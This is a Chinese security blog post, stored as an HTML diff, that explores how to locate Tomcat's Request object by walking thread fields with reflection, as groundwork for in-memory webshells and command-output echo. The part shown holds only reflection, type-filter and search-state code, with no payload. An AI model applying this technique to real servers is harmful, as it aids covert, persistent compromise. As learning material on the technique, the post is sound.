@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"f19t.github.io.git","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="java内存马回显初探在学习java内存马回显时，总是在复现别人的利用链，就想着我们自己该怎么去找构造链呢。在网上找资料的时候发现了https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;java-object-searcher&#x2F;,真的非常感谢大神们提供的寻找思路。为了检验之前学习的反射与算法基础，本篇文章详细讲解一下自己写搜索程序的过程。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java内存马回显初探">
+<meta property="og:url" content="https://f19t.github.io.git/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/index.html">
+<meta property="og:site_name" content="个人博客">
+<meta property="og:description" content="java内存马回显初探在学习java内存马回显时，总是在复现别人的利用链，就想着我们自己该怎么去找构造链呢。在网上找资料的时候发现了https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;java-object-searcher&#x2F;,真的非常感谢大神们提供的寻找思路。为了检验之前学习的反射与算法基础，本篇文章详细讲解一下自己写搜索程序的过程。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/16780848080571.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/16780849147183.jpg">
+<meta property="og:image" content="https://f19t.github.io.git/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/16780962023051.jpg">
+<meta property="article:published_time" content="2023-03-06T09:54:08.000Z">
+<meta property="article:modified_time" content="2023-03-06T10:12:16.488Z">
+<meta property="article:author" content="f19t">
+<meta property="article:tag" content="JAVASEC">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://f19t.github.io.git/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/16780848080571.jpg">
+
+<link rel="canonical" href="https://f19t.github.io.git/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>java内存马回显初探 | 个人博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">个人博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://f19t.github.io.git/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="f19t">
+      <meta itemprop="description" content="个人学习的一些记录。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="个人博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          java内存马回显初探
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-03-06 17:54:08 / 修改时间：18:12:16" itemprop="dateCreated datePublished" datetime="2023-03-06T17:54:08+08:00">2023-03-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">JAVA安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="java内存马回显初探"><a href="#java内存马回显初探" class="headerlink" title="java内存马回显初探"></a>java内存马回显初探</h2><p>在学习java内存马回显时，总是在复现别人的利用链，就想着我们自己该怎么去找构造链呢。在网上找资料的时候发现了<strong><a target="_blank" rel="noopener" href="https://github.com/c0ny1/java-object-searcher/">https://github.com/c0ny1/java-object-searcher/</a></strong>,真的非常感谢大神们提供的寻找思路。为了检验之前学习的反射与算法基础，本篇文章详细讲解一下自己写搜索程序的过程。</p>
+<span id="more"></span>
+<p><strong>环境说明</strong></p>
+<ul>
+<li>Tomcat&#x2F;8.5.83</li>
+<li>java version “1.8.0_152”</li>
+<li>idea 2023.3.2</li>
+</ul>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>我们再写内存马时，比如写linsener内存马时，需要先获取当前应用的<strong>StandardContext</strong>，回显的时候需要获取当前应用当前进程的<strong>response</strong>。又因为：</p>
+<ul>
+<li>Request对象可以获取到StandardContext，Request.getContext()。</li>
+<li>Request对象也可以获得response，例如tomcat的Request具体实现类org.apache.catalina.connector.Request里面包含<strong>protected Response response;</strong></li>
+</ul>
+<hr>
+<p>所以我们如果能获取到当前访问的<strong>Request</strong>，我们就可以实现写内存马和进行回显。</p>
+<h3 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a>准备知识</h3><h4 id="存储Request的位置"><a href="#存储Request的位置" class="headerlink" title="存储Request的位置"></a>存储Request的位置</h4><p>通常情况下，java-web作为多线程应用，Request对象通常存在在线程里面，我们可以通过<strong>Thread.currentThread()</strong> 来获取到当前的线程对象。<br>例如我们写一个简单的jsp，println的位置下断点，我们通过idea自带的评估表达式（Evaluate），执行Thread.currentThread()看一下。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;sss&quot;</span>;</span><br><span class="line">    System.out.println(s);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>我们发现获取到的确实是当前线程的对象，他的类型为org.apache.tomcat.util.threads.TaskThread。TaskThread继承了Thread。<br><img src="/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/16780848080571.jpg"></p>
+<h4 id="反射获取TaskThread里面所有变量"><a href="#反射获取TaskThread里面所有变量" class="headerlink" title="反射获取TaskThread里面所有变量"></a>反射获取TaskThread里面所有变量</h4><p>我们知道反射可以获取对象的字段、字段值、字段类型。反射学习详见：<strong><a target="_blank" rel="noopener" href="https://f19t.github.io/2023/02/19/Java%E5%8F%8D%E5%B0%84/">https://f19t.github.io/2023/02/19/Java%E5%8F%8D%E5%B0%84/</a></strong></p>
+<p>所以这里我们可以写一个servlet程序获取到TaskThread的所有字段以及字段属性。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.threads.TaskThread;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/3/2 14:52</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/simple&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">simple</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">TaskThread</span> <span class="variable">t</span> <span class="operator">=</span> (TaskThread) Thread.currentThread();</span><br><span class="line">        Field fields[] = TaskThread.class.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            fields[i].setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;字段名=&quot;</span>+fields[i].getName());</span><br><span class="line">                System.out.println(<span class="string">&quot;字段值=&quot;</span>+fields[i].get(t));<span class="comment">//get方法需要传入实例对象</span></span><br><span class="line">                System.out.println(<span class="string">&quot;字段类型=&quot;</span>+fields[i].getType());</span><br><span class="line">                <span class="type">int</span> <span class="variable">mod</span> <span class="operator">=</span> fields[i].getModifiers();</span><br><span class="line">                System.out.println(<span class="string">&quot;声明类型=&quot;</span>+ Modifier.toString(mod));</span><br><span class="line">                System.out.println(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">          </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输出：</span><br><span class="line">字段名=log</span><br><span class="line">字段值=org.apache.juli.logging.DirectJDKLog@397d3266</span><br><span class="line">字段类型=<span class="keyword">interface</span> <span class="title class_">org</span>.apache.juli.logging.Log</span><br><span class="line">声明类型=<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span></span><br><span class="line">----------------------------</span><br><span class="line">字段名=creationTime</span><br><span class="line">字段值=<span class="number">1677745450986</span></span><br><span class="line">字段类型=<span class="type">long</span></span><br><span class="line">声明类型=<span class="keyword">private</span> <span class="keyword">final</span></span><br></pre></td></tr></table></figure>
+<p>为什么只输出了两个字段呢，那是因为TaskThread类里面确实只有这两个字段，但是我们调试的时候发现TaskThread里面有很多字段呀，这是因为TaskThread继承一些父类，我们要想获得TaskThread的所有字段，还得去遍历他们的父类,为了方便查看字段在哪个类里面，我们也打印一下类名。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.threads.TaskThread;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/3/2 14:52</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/simple&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">simple</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">TaskThread</span> <span class="variable">t</span> <span class="operator">=</span> (TaskThread) Thread.currentThread();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.tomcat.util.threads.TaskThread&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (; clazz != Object.class; clazz = clazz.getSuperclass()) &#123;</span><br><span class="line">                Field fields[] = clazz.getDeclaredFields();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">                    fields[i].setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot;类名=&quot;</span> + clazz);</span><br><span class="line">                    System.out.println(<span class="string">&quot;字段名=&quot;</span>+fields[i].getName());</span><br><span class="line">                    System.out.println(<span class="string">&quot;字段类型=&quot;</span>+fields[i].getType());</span><br><span class="line">                    <span class="type">int</span> <span class="variable">mod</span> <span class="operator">=</span> fields[i].getModifiers();</span><br><span class="line">                    System.out.println(<span class="string">&quot;声明类型=&quot;</span>+ Modifier.toString(mod));</span><br><span class="line">                    System.out.println(<span class="string">&quot;字段值=&quot;</span>+fields[i].get(t));<span class="comment">//get方法需要传入实例对象</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">结果：</span><br><span class="line">类名=<span class="keyword">class</span> <span class="title class_">org</span>.apache.tomcat.util.threads.TaskThread</span><br><span class="line">字段名=log</span><br><span class="line">字段类型=<span class="keyword">interface</span> <span class="title class_">org</span>.apache.juli.logging.Log</span><br><span class="line">声明类型=<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span></span><br><span class="line">字段值=org.apache.juli.logging.DirectJDKLog@21d6ac54</span><br><span class="line">----------------------------</span><br><span class="line">类名=<span class="keyword">class</span> <span class="title class_">org</span>.apache.tomcat.util.threads.TaskThread</span><br><span class="line">字段名=creationTime</span><br><span class="line">字段类型=<span class="type">long</span></span><br><span class="line">声明类型=<span class="keyword">private</span> <span class="keyword">final</span></span><br><span class="line">字段值=<span class="number">1677750206025</span></span><br><span class="line">----------------------------</span><br><span class="line">类名=<span class="keyword">class</span> <span class="title class_">java</span>.lang.Thread</span><br><span class="line">字段名=name</span><br><span class="line">字段类型=<span class="keyword">class</span> <span class="title class_">java</span>.lang.String</span><br><span class="line">声明类型=<span class="keyword">private</span> <span class="keyword">volatile</span></span><br><span class="line">字段值=http-nio-<span class="number">8080</span>-exec-<span class="number">5</span></span><br><span class="line">----------------------------</span><br><span class="line">类名=<span class="keyword">class</span> <span class="title class_">java</span>.lang.Thread</span><br><span class="line">字段名=priority</span><br><span class="line">字段类型=<span class="type">int</span></span><br><span class="line">声明类型=<span class="keyword">private</span></span><br><span class="line">字段值=<span class="number">5</span></span><br><span class="line">----------------------------</span><br><span class="line">........</span><br><span class="line">........后面字段省略</span><br></pre></td></tr></table></figure>
+
+<p>到这里我们获取了所有TaskThread的字段，字段的种类有很多我们需筛选，显然java提供的八种基础类型不是我们需要的。我们需要的类型是<strong>引用数据</strong>类型，也就是可能存在对象或者集合（集合里面可能存在其他类）。<br>这里我们可以创建一个黑名单，在黑名单里面的我们不进行输出。到这里我们的Object的处理逻辑就清晰了，先判断是否是黑名单，如果是普通对象那么就进行取值，如果是集合类型或者是数组类型的我们将数组内的所有值都取出来。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//黑名单</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isblack</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">aBoolean</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        List&lt;String&gt; black = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(Arrays.asList(<span class="string">&quot;java.lang.Byte&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Short&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Integer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Long&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Float&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Boolean&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Character&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.io.File&quot;</span>,</span><br><span class="line">                <span class="string">&quot;byte&quot;</span>,</span><br><span class="line">                <span class="string">&quot;short&quot;</span>,</span><br><span class="line">                <span class="string">&quot;int&quot;</span>,</span><br><span class="line">                <span class="string">&quot;long&quot;</span>,</span><br><span class="line">                <span class="string">&quot;double&quot;</span>,</span><br><span class="line">                <span class="string">&quot;float&quot;</span>,</span><br><span class="line">                <span class="string">&quot;boolean&quot;</span></span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; black.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s == black.get(i)) &#123;</span><br><span class="line">                aBoolean = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">return</span> aBoolean;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> aBoolean;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断list</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">is_list</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;List&quot;</span>.equals(s) || <span class="string">&quot;ArrayList&quot;</span>.equals(s))&#123;</span><br><span class="line">            b = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断map</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">is_map</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;Map&quot;</span>.equals(s) || <span class="string">&quot;HashMap&quot;</span>.equals(s))&#123;</span><br><span class="line">            b = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们使用广度优先搜索算法去遍历所有的变量。这里我们定义一个类似于c语言结构体的类，用来存储状态。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">location</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">location</span><span class="params">(Object obj, String clazz, String path)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.obj = obj;</span><br><span class="line">        <span class="built_in">this</span>.path = path;</span><br><span class="line">        <span class="built_in">this</span>.clazz = clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object obj;</span><br><span class="line">    <span class="keyword">public</span> String path;</span><br><span class="line">    <span class="keyword">public</span> String clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
